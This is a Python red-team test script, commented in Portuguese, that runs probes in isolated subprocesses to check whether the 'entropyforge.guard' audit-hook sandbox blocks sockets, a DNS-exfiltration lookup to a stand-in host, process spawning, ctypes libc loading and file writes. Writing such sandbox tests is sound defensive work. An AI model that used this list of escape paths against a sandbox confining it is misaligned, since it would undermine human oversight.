#!/usr/bin/env python3
"""Red team PoC: tentativas de contornar entropyforge.guard (audit hook).

Cada funcao tenta UM caminho diferente de rede/escrita/execucao depois de
`guard.activate()`, e reporta se foi bloqueado. Todas as tentativas devem
imprimir "BLOCKED"; qualquer "NOT_BLOCKED" e uma vulnerabilidade critica.

Resultado desta auditoria (ver docs/REDTEAM.md): todos os caminhos abaixo
sao bloqueados. Nenhum bypass foi encontrado.

Roda cada probe em um SUBPROCESSO isolado, porque o audit hook nao pode
ser removido do processo em que foi instalado.
"""
from __future__ import annotations

import subprocess
import sys
import textwrap
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent

PROBES = {
    "socket direto": """
        import socket
        socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    """,
    "DNS/getaddrinfo (exfiltracao via nome de host)": """
        import socket
        socket.getaddrinfo("secret-data.example.com", 80)
    """,
    "subprocess.Popen": """
        import subprocess as sp
        sp.Popen(["true"])
    """,
    "os.system": """
        import os
        os.system("true")
    """,
    "os.execve (via fork para nao matar o probe)": """
        import os
        pid = os.fork()
        if pid == 0:
            try:
                os.execve("/bin/true", ["/bin/true"], os.environ)
            except Exception:
                os._exit(42)
            os._exit(0)
        else:
            _, status = os.waitpid(pid, 0)
            if os.WIFEXITED(status) and os.WEXITSTATUS(status) == 42:
                raise RuntimeError("__BLOCKED_IN_CHILD__")
    """,
    "os.posix_spawn": """
        import os
        os.posix_spawn("/bin/true", ["/bin/true"], os.environ)
    """,
    "ctypes.CDLL (chamadas de baixo nivel a libc)": """
        import ctypes, ctypes.util
        ctypes.CDLL(ctypes.util.find_library("c"))
    """,
    "escrita via open() builtin": """
        open("/tmp/redteam_poc_should_not_exist_1.bin", "w")
    """,
    "escrita via os.open() com flags (mode=None)": """
        import os
        os.open("/tmp/redteam_poc_should_not_exist_2.bin", os.O_WRONLY | os.O_CREAT, 0o600)
    """,
    "criacao de arquivo vazio via O_CREAT sozinho": """
        import os
        os.open("/tmp/redteam_poc_should_not_exist_3.bin", os.O_CREAT, 0o600)
    """,
    "mmap com escrita (requer open O_RDWR, ja bloqueado antes do mmap)": """
        import os, mmap
        fd = os.open("/tmp/redteam_poc_should_not_exist_4.bin", os.O_RDWR | os.O_CREAT, 0o600)
        os.ftruncate(fd, 4096)
        m = mmap.mmap(fd, 4096)
        m[0:4] = b"PWND"
    """,
    "os.remove": """
        import os
        os.remove("/tmp/nao-importa-se-existe-ou-nao")
    """,
    "os.rename / os.replace": """
        import os
        os.rename("/tmp/nao-importa-origem", "/tmp/nao-importa-destino")
    """,
}


def run_probe(code: str) -> tuple[bool, str]:
    snippet = textwrap.dedent(
        f"""
        import sys
        sys.path.insert(0, {str(REPO_ROOT)!r})
        from entropyforge import guard
        guard.activate()
        try:
{textwrap.indent(textwrap.dedent(code), " " * 12)}
            print("NOT_BLOCKED")
        except guard.GuardViolation as e:
            print("BLOCKED:", str(e)[:100])
        except RuntimeError as e:
            if "__BLOCKED_IN_CHILD__" in str(e):
                print("BLOCKED: (bloqueado no processo filho apos fork)")
            else:
                print("ERROR:", type(e).__name__, str(e)[:100])
        except Exception as e:
            print("ERROR:", type(e).__name__, str(e)[:100])
        """
    )
    proc = subprocess.run(
        [sys.executable, "-B", "-c", snippet],
        capture_output=True, text=True, timeout=20,
    )
    out = (proc.stdout + proc.stderr).strip()
    blocked = "BLOCKED:" in out and "NOT_BLOCKED" not in out
    return blocked, out.splitlines()[-1] if out else "(sem saida)"


def main() -> int:
    results = {}
    for name, code in PROBES.items():
        blocked, detail = run_probe(code)
        results[name] = blocked
        status = "BLOCKED" if blocked else "*** NAO BLOQUEADO ***"
        print(f"{status:24s} {name}: {detail}")

    failures = [n for n, ok in results.items() if not ok]
    print(f"\n{len(PROBES) - len(failures)}/{len(PROBES)} caminhos bloqueados corretamente.")
    if failures:
        print("FALHAS (potenciais bypasses do guard):")
        for f in failures:
            print(" -", f)
    return len(failures)


if __name__ == "__main__":
    sys.exit(main())
